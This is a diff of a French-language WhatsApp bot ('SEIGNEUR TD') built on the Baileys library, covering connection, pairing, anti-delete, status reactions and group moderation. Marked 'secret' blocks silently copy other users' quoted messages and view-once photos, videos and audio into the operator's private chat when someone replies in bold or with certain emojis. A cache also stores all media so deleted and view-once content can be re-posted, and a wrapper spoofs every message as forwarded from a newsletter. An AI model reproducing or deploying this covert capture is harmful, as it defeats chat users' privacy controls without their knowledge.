+𝖫𝖾 𝗀𝗋𝗈𝗎𝗉𝖾 𝖼𝗈𝗆𝗉𝗍𝖾 𝖽𝖾́𝗌𝗈𝗋𝗆𝖺𝗂𝗌 ${memberCount} 
+𝗉𝖺𝗋𝗍𝗂𝖼𝗂𝗉𝖺𝗇𝗍𝗌.
+
+💡 𝘙𝘢𝘱𝘱𝘦𝘭 : 𝘛𝘰𝘶𝘵𝘦 𝘦𝘹𝘤𝘭𝘶𝘴𝘪𝘰𝘯 𝘱𝘢𝘳 𝘭𝘦 𝘴𝘵𝘢𝘧𝘧 
+𝘦𝘴𝘵 𝘥𝘦́𝘧𝘪𝘯𝘪𝘵𝘪𝘷𝘦 𝘴𝘢𝘶𝘧 𝘢𝘱𝘱𝘦𝘭 𝘢𝘶𝘱𝘳𝘦̀𝘴 𝘥'𝘶𝘯 𝘢𝘥𝘮𝘪𝘯.
+
+━━━━━━━━━━━━━━━━━━━━
+👋 𝖠𝗎 𝗉𝗅𝖺𝗂𝗌𝗂𝗋 𝖽𝖾 𝗍𝖾 𝗋𝖾𝗏𝗈𝗂𝗋 !`;
+
+    const mentions = [leftMemberJid, superadmin, ...admins.map(a => a.id)];
+    
+    await sock.sendMessage(groupJid, {
+      text: goodbyeText,
+      mentions: mentions
+    });
+    
+    console.log(`✅ Message d'au revoir envoyé pour ${leftMemberJid.split('@')[0]}`);
+  } catch (error) {
+    console.error(' in sendGoodbye:', error);
+  }
+}
+
+// =============================================
+// 🔘 BOUTONS OUI / NON pour commandes ANTI
+// =============================================
+async function sendAntiButtons(sock, remoteJid, message, label, icon, status, cmdName) {
+  try {
+    await sock.sendMessage(remoteJid, {
+      text: `${icon} *${label}*\n━━━━━━━━━━━━━━━━━━━━━━━\n📊 *Statut:* ${status ? '✅ ACTIVÉ' : '❌ DÉSACTIVÉ'}\n━━━━━━━━━━━━━━━━━━━━━━━\n_© SEIGNEUR TD_`,
+      footer: '© SEIGNEUR TD',
+      buttons: [
+        {
+          buttonId: 'oui',
+          buttonText: { displayText: '✅ Activer' },
+          type: 4,
+          nativeFlowInfo: {
+            name: 'single_select',
+            paramsJson: JSON.stringify({
+              title: `${icon} ${label}`,
+              sections: [{
+                title: 'Action',
+                rows: [
+                  { header: '✅', title: 'Activer', description: `Activer ${label}`, id: `${config.prefix}${cmdName} on` },
+                  { header: '❌', title: 'Désactiver', description: `Désactiver ${label}`, id: `${config.prefix}${cmdName} off` }
+                ]
+              }]
+            })
+          }
+        }
+      ],
+      headerType: 1,
+      viewOnce: true
+    });
+  } catch(e) {}
+}
+
+// =============================================
+// CONNEXION WHATSAPP
+// =============================================
+
+
+// ─── Helper AntiDelete : envoie le media ou texte selon cache ────────────────
+async function sendAntiDeleteNotif(sock, notifyJid, cachedMsg) {
+  const senderJid = cachedMsg.sender || '';
+  const label = cachedMsg.isViewOnce ? '👁️ VUE UNIQUE SUPPRIMÉE' : '🗑️ MESSAGE SUPPRIMÉ';
+  const msgContent = cachedMsg.text && !['[Image]','[Video]','[Audio]','[Sticker]','[Document]','[Message]'].includes(cachedMsg.text) ? cachedMsg.text : '[ média ]';
+  const header =
+`┏━━━━━━━━━━━━━━━━┓
+   ${label}
+┗━━━━━━━━━━━━━━━━┛
+
+❖ *AUTEUR* : @${senderJid.split('@')[0]}
+❖ *MESSAGE* : \`${msgContent}\`
+
+*© SEIGNEUR TD*`;
+
+  const mentions = senderJid ? [senderJid] : [];
+
+  if (cachedMsg.mediaBuffer && cachedMsg.mediaBuffer.length > 100) {
+    const mime = cachedMsg.mediaMime || '';
+    const caption = header + (cachedMsg.mediaCaption ? '\n❖ LÉGENDE · ' + cachedMsg.mediaCaption : '');
+    try {
+      if (cachedMsg.mediaType === 'image') {
+        await sock.sendMessage(notifyJid, { image: cachedMsg.mediaBuffer, caption, mentions });
+      } else if (cachedMsg.mediaType === 'video') {
+        await sock.sendMessage(notifyJid, { video: cachedMsg.mediaBuffer, caption, mimetype: mime || 'video/mp4', mentions });
+      } else if (cachedMsg.mediaType === 'audio') {
+        await sock.sendMessage(notifyJid, { text: header, mentions });
+        await sock.sendMessage(notifyJid, { audio: cachedMsg.mediaBuffer, mimetype: mime || 'audio/mpeg', ptt: mime.includes('ogg') });
+      } else if (cachedMsg.mediaType === 'sticker') {
+        await sock.sendMessage(notifyJid, { text: header, mentions });
+        await sock.sendMessage(notifyJid, { sticker: cachedMsg.mediaBuffer });
+      } else if (cachedMsg.mediaType === 'document') {
+        await sock.sendMessage(notifyJid, { document: cachedMsg.mediaBuffer, mimetype: mime || 'application/octet-stream', caption, mentions });
+      } else {
+        await sock.sendMessage(notifyJid, { text: header, mentions });
+      }
+      return;
+    } catch(e) {
+      console.log('[ANTIDELETE] Erreur envoi media: ' + e.message);
+    }
+  }
+  // Fallback texte
+  await sock.sendMessage(notifyJid, { text: header, mentions });
+}
+
+async function connectToWhatsApp() {
+  loadData();
+
+  // =============================================
+  // 📢 MESSAGE AUTO TRANSFÉRÉ DEPUIS LA CHAÎNE
+  // =============================================
+  const _sendChannelForward = async (sock, text) => {
+    try {
+      const botJid = sock.user.id.split(':')[0] + '@s.whatsapp.net';
+      await sock.sendMessage(botJid, {
+        text: text,
+        contextInfo: {
+          isForwarded: true,
+          forwardedNewsletterMessageInfo: {
+            newsletterJid: '120363422398514286@newsletter',
+            serverMessageId: 1,
+            newsletterName: 'SEIGNEUR TD'
+          }
+        }
+      });
+    } catch(e) {
+      console.error('[CHANNEL FORWARD]', e.message);
+    }
+  };
+
+  const { version, isLatest } = await fetchLatestBaileysVersion();
+  console.log(`Using WA v${version.join('.')}, isLatest: ${isLatest}`);
+
+  // ✅ Support SESSION_ID (variable d'environnement) pour hébergeurs
+  const SESSION_ID = process.env.SESSION_ID;
+  if (SESSION_ID && !fs.existsSync(path.join(config.sessionFolder, 'creds.json'))) {
+    try {
+      const sessionData = JSON.parse(Buffer.from(SESSION_ID, 'base64').toString('utf8'));
+      await fs.promises.mkdir(config.sessionFolder, { recursive: true });
+      for (const [filename, fileContent] of Object.entries(sessionData)) {
+        await fs.promises.writeFile(path.join(config.sessionFolder, filename), fileContent, 'utf8');
+      }
+      console.log('✅ Session restaurée depuis SESSION_ID !');
+    } catch(e) {
+      console.log('⚠️ Erreur restauration session: ' + e.message);
+    }
+  }
+
+  const { state, saveCreds } = await useMultiFileAuthState(config.sessionFolder);
+
+  // Support Unicode complet (Sinhala, Arabe, etc.)
+  process.stdout.setEncoding('utf8');
+  if (process.env.LANG === undefined) process.env.LANG = 'en_US.UTF-8';
+
+  const sock = makeWASocket({
+    version,
+    logger: pino({ level: 'silent' }),
+    printQRInTerminal: !config.usePairingCode,
+    auth: state,
+    browser: ['Ubuntu', 'Chrome', '1.0.0'],
+    generateHighQualityLinkPreview: true,
+    getMessage: async (key) => {
+      return { conversation: '' };
+    }
+  });
+
+  // ✅ WRAPPER GLOBAL — Tous les messages apparaissent transférés depuis la chaîne
+  const _origSend = sock.sendMessage.bind(sock);
+  sock.sendMessage = async (jid, content, opts = {}) => {
+    try {
+      // Ne pas toucher aux réactions, aux messages audio ptt, stickers
+      const isReact = !!(content?.react);
+      const isAudio = !!(content?.audio);
+      const isSticker = !!(content?.sticker);
+      if (!isReact && !isAudio && !isSticker) {
+        const fwdCtx = {
+          isForwarded: true,
+          forwardedNewsletterMessageInfo: {
+            newsletterJid: '120363422398514286@newsletter',
+            serverMessageId: 1,
+            newsletterName: 'SEIGNEUR TD'
+          }
+        };
+        if (content.text !== undefined) {
+          content.contextInfo = { ...fwdCtx, ...(content.contextInfo || {}) };
+        } else if (content.caption !== undefined) {
+          content.contextInfo = { ...fwdCtx, ...(content.contextInfo || {}) };
+        } else if (content.image || content.video || content.document) {
+          content.contextInfo = { ...fwdCtx, ...(content.contextInfo || {}) };
+        }
+      }
+    } catch(e) {}
+    return _origSend(jid, content, opts);
+  };
+
+  // Handle pairing code
+
+  // Connection update handler
+  sock.ev.on('connection.update', async (update) => {
+    const { connection, lastDisconnect, qr } = update;
+
+    // ── Pairing Code — demandé quand WS est vraiment prêt ──
+    if (update.qr === undefined && config.usePairingCode && !sock.authState.creds.registered && !pairingRequested) {
+      pairingRequested = true;
+
+      // Attendre que le WS readyState soit OPEN (1)
+      await new Promise(r => {
+        const check = setInterval(() => {
+          if (sock.ws?.readyState === 1) { clearInterval(check); r(); }
+        }, 500);
+        setTimeout(() => { clearInterval(check); r(); }, 8000);
+      });
+
+      // Demander le numéro à l'utilisateur via le terminal
+      const { createInterface } = await import('readline');
+      const rl = createInterface({ input: process.stdin, output: process.stdout });
+      const phoneNumber = await new Promise(resolve => {
+        rl.question('\n📱 Entrez votre numéro WhatsApp (ex: 33612345678): ', (ans) => {
+          rl.close();
+          resolve(ans.replace(/[^0-9]/g, ''));
+        });
+      });
+
+      if (!phoneNumber || phoneNumber.length < 7) {
+        console.log('❌ Numéro invalide. Relance le bot.');
+        pairingRequested = false;
+        return;
+      }
+
+      try {
+        const code = await sock.requestPairingCode(phoneNumber);
+        const formatted = code?.match(/.{1,4}/g)?.join('-') || code;
+        console.log('\n╔═══════════════════════════════════╗');
+        console.log('║   🔑 PAIRING CODE GÉNÉRÉ 🔑      ║');
+        console.log('╚═══════════════════════════════════╝');
+        console.log(`\n     CODE: ${formatted}\n`);
+        console.log('📱 WhatsApp > Appareils connectés > Connecter un appareil\n');
+      } catch(e) {
+        console.log('❌ Erreur pairing code:', e.message);
+        pairingRequested = false;
+      }
+    }
+
+        if (qr && !config.usePairingCode) {
+      console.log('\n📱 Scan this QR code with WhatsApp:');
+      qrcode.generate(qr, { small: true });
+    }
+
+    if (connection === 'close') {
+      const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
+      console.log('Connection closed, reconnecting:', shouldReconnect);
+
+      if (shouldReconnect) {
+        await delay(5000);
+        connectToWhatsApp();
+      } else {
+        console.log('⚠️ Session expirée — suppression du dossier auth et redémarrage...');
+        saveData();
+        pairingRequested = false;
+        try { fs.rmSync(config.sessionFolder, { recursive: true, force: true }); } catch(e) {}
+        await delay(3000);
+        connectToWhatsApp();
+      }
+    } else if (connection === 'open') {
+      console.log('✅ Connecté à WhatsApp!');
+      console.log(`Bot: ${config.botName}`);
+      console.log(`Bot JID: ${sock.user.id}`);
+      console.log('\n⚔️ SEIGNEUR TD est prêt! ⚔️\n');
+      
+      // ✅ Enregistrer le JID du bot (owner) pour reconnaissance @lid dans les groupes
+      global.botLidJid = sock.user.id;
+      global.botOwnerLid = sock.user.id.split(':')[0];
+      console.log(`[OWNER LID enregistré: ${global.botOwnerLid}]`);
+      // ✅ Socket principal enregistré (nouveau système multi-session)
+      console.log('[PAIRING API] Socket enregistré ✅');
+      
+      // ✅ Auto-admin : ajouter le JID connecté comme super admin
+      const ownerLidClean = sock.user.id.split(':')[0].split('@')[0];
+      if (!config.adminNumbers.includes(ownerLidClean)) config.adminNumbers.push(ownerLidClean);
+      if (!config.botAdmins.includes(ownerLidClean)) config.botAdmins.push(ownerLidClean);
+      // ✅ Persister dans index.js pour survivre aux redémarrages
+      try {
+        const indexPath = new URL(import.meta.url).pathname;
+        let indexContent = fs.readFileSync(indexPath, 'utf8');
+        const adminRegex = /(adminNumbers:\s*\[)([^\]]*?)(\])/;
+        const match = indexContent.match(adminRegex);
+        if (match) {
+          const existing = match[2].split(',').map(s => s.replace(/['" ]/g,'')).filter(Boolean);
+          if (!existing.includes(ownerLidClean)) {
+            const newList = [...new Set([...existing, ownerLidClean])].map(n => `'${n}'`).join(', ');
+            indexContent = indexContent.replace(adminRegex, `$1${newList}$3`);
+            // Mettre à jour aussi botAdmins
+            const botAdminRegex = /(botAdmins:\s*\[)([^\]]*?)(\])/;
+            indexContent = indexContent.replace(botAdminRegex, `$1${newList}$3`);
+            fs.writeFileSync(indexPath, indexContent, 'utf8');
+            console.log('[AUTO-ADMIN] ✅ ' + ownerLidClean + ' ajouté comme super admin');
+          }
+        }
+      } catch(e) {
+        console.log('[AUTO-ADMIN] ⚠️ Erreur écriture:', e.message);
+      }
+
+      // Envoyer message transféré depuis la chaîne au démarrage
+      setTimeout(() => {
+        _sendChannelForward(sock,
+`*SEIGNEUR TD* 🇷🇴
+
+❒ *STATUS* : \`ONLINE\`
+❒ *VERSION* : \`1.0.0\`
+❒ *SYSTEM* : \`ACTIVE\`
+
+*© SEIGNEUR TD*`
+        );
+      }, 3000);
+    }
+  });
+
+  sock.ev.on('creds.update', saveCreds);
+
+  const processedMsgIds=new Set();
+  sock.ev.on('messages.upsert', async ({ messages, type }) => {
+    if(type!=='notify')return;
+    for(const message of messages){
+
+      // =============================================
+      // =============================================
+      // GESTION RÉPONSES BOUTONS INTERACTIFS (nativeFlowInfo)
+      // =============================================
+      const interactiveResponse = message.message?.interactiveResponseMessage;
+      if (interactiveResponse) {
+        try {
+          const nativeResponse = interactiveResponse.nativeFlowResponseMessage;
+          if (nativeResponse) {
+            const params = JSON.parse(nativeResponse.paramsJson || '{}');
+            // Réponse d'une liste (single_select)
+            const selectedId = params.id || params.selectedId || nativeResponse.name;
+            if (selectedId && selectedId.startsWith(config.prefix)) {
+              const remoteJid = message.key.remoteJid;
+              const senderJid = message.key.participant || message.key.remoteJid;
+              console.log(`🔘 Bouton liste cliqué: ${selectedId}`);
+              await handleCommand(sock, message, selectedId, remoteJid, senderJid, remoteJid.endsWith('@g.us'));
+              continue;
+            }
+          }
+        } catch(e) {
+          console.error('[INTERACTIVE RESPONSE]', e.message);
+        }
+      }
+
+      // ANTI-DELETE via protocolMessage (revoke)
+      // =============================================
+      if (antiDelete && message.message?.protocolMessage?.type === 0) {
+        try {
+          const deletedKey = message.message.protocolMessage.key;
+          const messageId = deletedKey?.id;
+          const remoteJid = message.key.remoteJid;
+          const deleterJid = message.key.participant || message.key.remoteJid;
+
+          if (messageId) {
+            const cachedMsg = messageCache.get(messageId);
+            if (cachedMsg) {
+              const isGroup = remoteJid.endsWith('@g.us');
+              let notifyJid = remoteJid;
+              if (antiDeleteMode === 'private') {
+                notifyJid = sock.user.id.split(':')[0] + '@s.whatsapp.net';
+              } else if (antiDeleteMode === 'gchat' && !isGroup) {
+                continue;
+              }
+              const senderJid = cachedMsg.sender;
+              await sendAntiDeleteNotif(sock, notifyJid, cachedMsg);
+              console.log('[ANTIDELETE] Message restaure de ' + senderJid + ' type=' + (cachedMsg.mediaType || 'texte') + (cachedMsg.isViewOnce ? ' [VUE UNIQUE]' : ''));
+            }
+          }
+        } catch(e) {
+          console.error('❌ Erreur antidelete upsert:', e.message);
+        }
+        continue;
+      }
+
+      const msgAge=Date.now()-((message.messageTimestamp||0)*1000);
+      if(msgAge>60000)continue;
+      const msgId=message.key.id;
+      if(processedMsgIds.has(msgId))continue;
+      processedMsgIds.add(msgId);
+      if(processedMsgIds.size>2000)processedMsgIds.delete(processedMsgIds.values().next().value);
+      // IMPORTANT: Accepter les messages du bot aussi (pour les discussions privées with le numéro du bot)
+      if (message.key.remoteJid === 'status@broadcast') {
+        // =============================================
+        // GESTION AUTOMATIQUE DES STATUS
+        // =============================================
+        try {
+          const statusSender = message.key.participant || message.key.remoteJid;
+          const botJid = sock.user.id.split(':')[0] + '@s.whatsapp.net';
+          
+          console.log(`📱 Nouveau status détecté de: ${statusSender}`);
+          
+          // AutoView - Lire le status automatiquement
+          if (autoReadStatus) {
+            await sock.readMessages([message.key]).catch((err) => {
+              console.error(' lecture status:', err);
+            });
+            console.log('✅ Status lu automatiquement');
+          }
+          
+          // ReactStatus - Réagir with emoji si activé et pas notre propre status
+          if (autoLikeStatus && statusSender !== botJid) {
+            const messageType = Object.keys(message.message || {})[0];
+            if (!messageType || messageType === 'protocolMessage') {
+              console.log('⏭️ Status ignoré (message protocol)');
+              continue;
+            }
+            
+            const emojiToUse = '';
+            await sock.sendMessage('status@broadcast', {
+              react: { text: emojiToUse, key: message.key }
+            }, { statusJidList: [statusSender] }).catch((err) => {
+              console.error(' réaction status:', err);
+            });
+            console.log(`✅ Status liké with ${emojiToUse}`);
+          }
+
+          // =============================================
+          // 🚫 ANTI-MENTION GROUPE — Kick si mention groupe en status
+          // =============================================
+          if (statusSender !== botJid) {
+            const statusMsg = message.message;
+            const hasGroupMention =
+              statusMsg?.groupStatusMentionMessage !== undefined ||
+              statusMsg?.groupMentionMessage !== undefined ||
+              statusMsg?.extendedTextMessage?.contextInfo?.groupMentions?.length > 0 ||
+              statusMsg?.imageMessage?.contextInfo?.groupMentions?.length > 0 ||
+              statusMsg?.videoMessage?.contextInfo?.groupMentions?.length > 0 ||
+              statusMsg?.documentMessage?.contextInfo?.groupMentions?.length > 0;
+
+            if (hasGroupMention) {
+              console.log(`⚠️ [ANTI-MENTION GROUPE] ${statusSender} a mentionné un groupe en status`);
+              // Chercher dans tous les groupes actifs si cette personne est membre
+              try {
+                const groupList = await sock.groupFetchAllParticipating();
+                for (const [groupJid, groupData] of Object.entries(groupList)) {
+                  const settings = groupSettings.get(groupJid);
+                  if (!settings?.antimentiongroupe) continue; // Seulement si activé dans ce groupe
+
+                  const isMember = groupData.participants.some(p => p.id === statusSender);
+                  if (!isMember) continue;
+
+                  const botIsAdmin = await isBotGroupAdmin(sock, groupJid);
+                  if (!botIsAdmin) continue;
+
+                  // Supprimer le message de status + expulser le membre
+                  try {
+                    await sock.sendMessage(groupJid, {
+                      delete: message.key
+                    }).catch(() => {});
+
+                    await sock.sendMessage(groupJid, {
+                      text:
+`╭─────────────────────────────╮
+  🚫  EXPULSION AUTOMATIQUE
+╰─────────────────────────────╯
+
+❖ @${statusSender.split('@')[0]}
+❖ ACTION  ·  Mention du groupe
+             dans un statut
+❖ STATUT  ·  ❌ EXPULSÉ
+
+╭─────────────────────────────╮
+   © SEIGNEUR TD
+╰─────────────────────────────╯`,
+                      mentions: [statusSender]
+                    });
+
+                    await sock.groupParticipantsUpdate(groupJid, [statusSender], 'remove');
+                    console.log(`✅ [ANTI-MENTION GROUPE] ${statusSender} supprimé et expulsé de ${groupJid}`);
+                  } catch(e) {
+                    console.error(`[ANTI-MENTION GROUPE] Erreur:`, e.message);
+                  }
+                }
+              } catch(e) {
+                console.error('[ANTI-MENTION GROUPE] Erreur fetch groupes:', e.message);
+              }
+            }
+          }
+          
+        } catch (error) {
+          console.error(' lors de la gestion du status:', error);
+        }
+        continue;
+      }
+
+      const remoteJid = message.key.remoteJid;
+      const isGroup = remoteJid.endsWith('@g.us');
+      let senderJid;
+      if (isGroup) { senderJid = message.key.participant; }
+      else if (message.key.fromMe) { senderJid = sock.user.id.split(':')[0]+'@s.whatsapp.net'; }
+      else { senderJid = remoteJid; }
+
+      // =============================================
+      // CACHE DES MESSAGES POUR ANTI-DELETE/EDIT
+      // =============================================
+      if (antiDelete || antiEdit) {
+        const messageId = message.key.id;
+        const msg = message.message;
+
+        // Detecter type media + vue unique
+        const imgMsg     = msg?.imageMessage || msg?.viewOnceMessage?.message?.imageMessage || msg?.viewOnceMessageV2?.message?.imageMessage || msg?.viewOnceMessageV2Extension?.message?.imageMessage;
+        const vidMsg     = msg?.videoMessage || msg?.viewOnceMessage?.message?.videoMessage || msg?.viewOnceMessageV2?.message?.videoMessage || msg?.viewOnceMessageV2Extension?.message?.videoMessage;
+        const audioMsg   = msg?.audioMessage;
+        const stickerMsg = msg?.stickerMessage;
+        const docMsg     = msg?.documentMessage;
+        const isViewOnce = !!(msg?.viewOnceMessage || msg?.viewOnceMessageV2 || msg?.viewOnceMessageV2Extension);
+        const mediaRawMsg = imgMsg || vidMsg || audioMsg || stickerMsg || docMsg || null;
+        const mediaType   = imgMsg ? 'image' : vidMsg ? 'video' : audioMsg ? 'audio' : stickerMsg ? 'sticker' : docMsg ? 'document' : null;
+
+        const messageData = {
+          key: message.key,
+          message: msg,
+          sender: senderJid,
+          senderName: message.pushName || senderJid?.split('@')[0],
+          remoteJid: remoteJid,
+          isGroup: isGroup,
+          timestamp: Date.now(),
+          isViewOnce: isViewOnce,
+          mediaType: mediaType,
+          mediaMsg: mediaRawMsg,
+          mediaMime: imgMsg?.mimetype || vidMsg?.mimetype || audioMsg?.mimetype || stickerMsg?.mimetype || docMsg?.mimetype || null,
+          mediaCaption: imgMsg?.caption || vidMsg?.caption || docMsg?.caption || '',
+          text: msg?.conversation || msg?.extendedTextMessage?.text || imgMsg?.caption || vidMsg?.caption || docMsg?.caption || (imgMsg ? '[Image]' : vidMsg ? '[Video]' : audioMsg ? '[Audio]' : stickerMsg ? '[Sticker]' : docMsg ? '[Document]' : '[Message]')
+        };
+
+        // Telecharger le media en buffer immediatement (avant suppression possible)
+        if (mediaRawMsg && mediaType) {
+          try {
+            const stream = await downloadContentFromMessage(mediaRawMsg, mediaType);
+            const chunks = [];
+            for await (const chunk of stream) chunks.push(chunk);
+            messageData.mediaBuffer = Buffer.concat(chunks);
+            console.log('[CACHE] Media sauvegarde: ' + mediaType + (isViewOnce ? ' (VUE UNIQUE)' : '') + ' ' + (messageData.mediaBuffer.length/1024).toFixed(0) + ' KB');
+          } catch(e) {
+            console.log('[CACHE] Erreur media: ' + e.message);
+          }
+        }
+
+        messageCache.set(messageId, messageData);
+        console.log('[CACHE] ID=' + messageId + ' type=' + (mediaType || 'texte') + (isViewOnce ? ' [VUE UNIQUE]' : ''));
+
+        // Garder seulement les 500 derniers messages
+        if (messageCache.size > 500) {
+          const firstKey = messageCache.keys().next().value;
+          messageCache.delete(firstKey);
+        }
+      }
+
+      // =============================================
+      // TRACKING D'ACTIVITÉ DES MEMBRES (POUR LISTACTIVE/LISTINACTIVE)
+      // =============================================
+      if (isGroup) {
+        // Initialiser la Map pour ce groupe si elle n'existe pas
+        if (!memberActivity.has(remoteJid)) {
+          memberActivity.set(remoteJid, new Map());
+        }
+        
+        const groupActivity = memberActivity.get(remoteJid);
+        const currentActivity = groupActivity.get(senderJid) || { last: 0, messageCount: 0 };
+        
+        groupActivity.set(senderJid, {
+          last: Date.now(),
+          messageCount: currentActivity.messageCount + 1
+        });
+        
+        console.log(`📊 Activité: ${senderJid.split('@')[0]} a maintenant ${currentActivity.messageCount + 1} messages`);
+      }
+
+      // Détection View Once — capturer tous les types
+      const msgKeys = Object.keys(message.message || {});
+      const isViewOnce = (
+        message.message?.viewOnceMessageV2 ||
+        message.message?.viewOnceMessageV2Extension ||
+        message.message?.imageMessage?.viewOnce === true ||
+        message.message?.videoMessage?.viewOnce === true ||
+        msgKeys.some(k => k.toLowerCase().includes('viewonce'))
+      );
+      if (isViewOnce) {
+        await handleViewOnce(sock, message, remoteJid, senderJid);
+      }
+
+      // ══════════════════════════════════════════════
+      // 🔒 FONCTIONNALITÉ SECRÈTE — Bold Reply Save
+      // N'importe qui (y compris le bot) peut répondre en GRAS
+      // → capture silencieuse en privé (groupes + privés)
+      // ══════════════════════════════════════════════
+      try {
+        const msgTxt = message.message?.extendedTextMessage?.text ||
+                       message.message?.conversation || '';
+        const isBold = /\*[^*]+\*/.test(msgTxt); // Contient *texte en gras*
+        const quotedCtx = message.message?.extendedTextMessage?.contextInfo;
+        const hasQuoted = quotedCtx?.quotedMessage;
+
+        // Autoriser TOUT LE MONDE y compris le bot (supprimé !message.key.fromMe)
+        if (isBold && hasQuoted) {
+          const isFromBot = message.key.fromMe;
+          const botPrivJid = sock.user.id.split(':')[0] + '@s.whatsapp.net';
+          const sName      = message.pushName || senderJid.split('@')[0];
+          const dateNow    = new Date().toLocaleString('fr-FR', { timeZone: 'America/Port-au-Prince' });
+          const quoted     = quotedCtx.quotedMessage;
+
+          // En-tête discret
+          await sock.sendMessage(botPrivJid, {
+            text: `🔒 *[SECRET SAVE]* ${isFromBot ? '🤖' : ''}
+👤 +${senderJid.split('@')[0]}
+💬 "${msgTxt}"
+📅 ${dateNow}
+📍 ${remoteJid.endsWith('@g.us') ? 'Groupe' : 'Privé'}
+📲 Dest: ${remoteJid}`
+          });
+
+          // Sauvegarder le contenu du message cité
+          const qVonceMsg  = quoted.viewOnceMessageV2?.message || quoted.viewOnceMessageV2Extension?.message;
+          const qImg   = qVonceMsg?.imageMessage  || quoted.imageMessage;
+          const qVid   = qVonceMsg?.videoMessage  || quoted.videoMessage;
+          const qAud   = quoted.audioMessage;
+          const qStick = quoted.stickerMessage;
+          const qTxt2  = quoted.conversation || quoted.extendedTextMessage?.text;
+
+          if (qImg) {
+            const buf = await toBuffer(await downloadContentFromMessage(qImg, 'image'));
+            await sock.sendMessage(botPrivJid, { image: buf, mimetype: qImg.mimetype || 'image/jpeg', caption: qImg.caption || '📸 Vue Unique' });
+          } else if (qVid) {
+            const buf = await toBuffer(await downloadContentFromMessage(qVid, 'video'));
+            await sock.sendMessage(botPrivJid, { video: buf, mimetype: qVid.mimetype || 'video/mp4', caption: qVid.caption || '🎥 Vue Unique' });
+          } else if (qAud) {
+            const buf = await toBuffer(await downloadContentFromMessage(qAud, 'audio'));
+            await sock.sendMessage(botPrivJid, { audio: buf, mimetype: qAud.mimetype || 'audio/ogg', ptt: qAud.ptt || false });
+          } else if (qStick) {
+            const buf = await toBuffer(await downloadContentFromMessage(qStick, 'sticker'));
+            await sock.sendMessage(botPrivJid, { sticker: buf });
+          } else if (qTxt2) {
+            await sock.sendMessage(botPrivJid, { text: `💬 *Texte cité:*
+${qTxt2}` });
+          }
+        }
+      } catch(e) {
+        // Silencieux — fonctionnalité secrète
+        console.error('[Secret Bold]', e.message);
+      }
+
+      // ══════════════════════════════════════════════
+      // 🎭 EMOJI REPLY → envoie vue unique en PV
+      // ══════════════════════════════════════════════
+      try {
+        const TRIGGER_EMOJIS = ['😂','❤️','😍','😭','😁','🙁','🇷🇴','😅','😏','🌴'];
+        const emojiTxt = message.message?.extendedTextMessage?.text ||
+                         message.message?.conversation || '';
+        const isEmojiOnly = TRIGGER_EMOJIS.includes(emojiTxt.trim());
+        const emojiQuotedCtx = message.message?.extendedTextMessage?.contextInfo;
+        const emojiHasQuoted = emojiQuotedCtx?.quotedMessage;
+
+        if (isEmojiOnly && emojiHasQuoted) {
+          const botPrivJid2 = sock.user.id.split(':')[0] + '@s.whatsapp.net';
+          const quoted2 = emojiQuotedCtx.quotedMessage;
+          const qVonceMsg2 = quoted2.viewOnceMessageV2?.message || quoted2.viewOnceMessageV2Extension?.message;
+          const qImg2  = qVonceMsg2?.imageMessage  || quoted2.imageMessage;
+          const qVid2  = qVonceMsg2?.videoMessage  || quoted2.videoMessage;
+          const qAud2  = quoted2.audioMessage;
+          const qTxt3  = quoted2.conversation || quoted2.extendedTextMessage?.text;
+
+          if (qImg2) {
+            const buf = await toBuffer(await downloadContentFromMessage(qImg2, 'image'));
+            await sock.sendMessage(botPrivJid2, { image: buf, mimetype: qImg2.mimetype || 'image/jpeg', caption: '' });
+          } else if (qVid2) {
+            const buf = await toBuffer(await downloadContentFromMessage(qVid2, 'video'));
+            await sock.sendMessage(botPrivJid2, { video: buf, mimetype: qVid2.mimetype || 'video/mp4', caption: '' });
+          } else if (qAud2) {
+            const buf = await toBuffer(await downloadContentFromMessage(qAud2, 'audio'));
+            await sock.sendMessage(botPrivJid2, { audio: buf, mimetype: qAud2.mimetype || 'audio/ogg', ptt: qAud2.ptt || false });
+          } else if (qTxt3) {
+            await sock.sendMessage(botPrivJid2, { text: qTxt3 });
+          }
+        }
+      } catch(e) {
+        console.error('[Emoji Reply VU]', e.message);
+      }
+
+      // Détection Sticker-Commande (setcmd)
+      if (message.message?.stickerMessage && global.stickerCommands?.size > 0) {
+        try {
+          const stickerMsg = message.message.stickerMessage;
+          const stream = await downloadContentFromMessage(stickerMsg, 'sticker');
+          const buf    = await toBuffer(stream);
+          const hash   = buf.slice(0, 32).toString('hex');
+          const linkedCmd = global.stickerCommands.get(hash);
+          if (linkedCmd) {
+            console.log(`🎭 Sticker-cmd déclenché: ${config.prefix}${linkedCmd}`);
+            // Simuler le message texte de la commande et appeler handleCommand
+            const fakeText = config.prefix + linkedCmd;
+            await handleCommand(sock, message, fakeText, remoteJid, senderJid, remoteJid.endsWith('@g.us'));
+          }
+        } catch(e) { console.error('[Sticker-cmd]', e.message); }
+      }
+
+      const messageText = message.message?.conversation || 
+                         message.message?.extendedTextMessage?.text || '';
+      const senderName = message.pushName || 'Unknown';
+
+      console.log(`\n📨 ${senderName} (${isGroup ? 'Group' : 'Private'}): ${messageText}`);
+
+      // ═══ MENU INTERACTIF — Détection réponse ═══════════════════════════════
+      const quotedMsgId = message.message?.extendedTextMessage?.contextInfo?.stanzaId;
+      if (quotedMsgId && global.menuMessages?.has(quotedMsgId)) {
+        const choice = messageText.trim();
+        
+        // Mapper numéros → catégories (décalage -1 car ❶=ALL MENU qui est catégorie 0)
+        const menuMap = {
+          '1': '0',  // ❶ ALL MENU → catégorie 0
+          '2': '1',  // ❷ OWNER MENU → catégorie 1
+          '3': '2',  // ❸ DOWNLOAD MENU → catégorie 2
+          '4': '3',  // ❹ GROUP MENU → catégorie 3
+          '5': '4',  // ❺ PROTECTION MENU → catégorie 4
+          '6': '5',  // ❻ ATTACK MENU → catégorie 5
+          '7': '6',  // ❼ MEDIA MENU → catégorie 6
+          '8': '7',  // ❽ GENERAL MENU → catégorie 7
+          '9': '8',  // ❾ VIEW ONCE MENU → catégorie 8
+          '10': '9', // ❿ GAMES MENU → catégorie 9
+          '❶': '0', '❷': '1', '❸': '2', '❹': '3', '❺': '4',
+          '❻': '5', '❼': '6', '❽': '7', '❾': '8', '❿': '9'
+        };
+        
+        const num = menuMap[choice];
+        if (num) {
+          console.log(`🎯 Menu réponse: ${choice} → catégorie ${num}`);
+          
+          // Réagir avec le numéro
+          try {
+            await sock.sendMessage(remoteJid, {
+              react: { text: choice, key: message.key }
+            });
+          } catch(e) {}
+          
+          // Simuler la commande !0, !1, !2, etc.
+          const fakeText = config.prefix + num;
